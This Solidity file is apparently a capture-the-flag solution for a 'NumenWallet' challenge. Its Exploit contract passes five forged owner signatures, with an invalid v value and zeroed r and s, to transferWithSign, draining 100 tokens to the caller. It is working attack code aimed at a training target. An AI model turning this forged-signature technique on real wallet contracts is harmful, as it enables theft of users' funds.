// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./challenge/NumenWallet.sol";

contract Exploit {
    function exploit(address instanceAddress) public {
        Wallet wallet = Wallet(instanceAddress);

        address[] memory owners = new address[](5);
        owners[0] = address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);
        owners[1] = address(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2);
        owners[2] = address(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db);
        owners[3] = address(0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB);
        owners[4] = address(0x617F2E2fD72FD9D5503197092aC168c91465E7f2);

        uint256 amount = 100 * 10 ** 18;
        address to = address(0x1337);

        SignedByowner[] memory signs = new SignedByowner[](5);
        for (uint256 i = 0; i < 5; i++) {
            signs[i] = SignedByowner(Holder(owners[i], "", true, ""), Signature(17, [bytes32(0), bytes32(0)]));
        }

        wallet.transferWithSign(address(this), 100 * 10 ** 18, signs);
    }
}
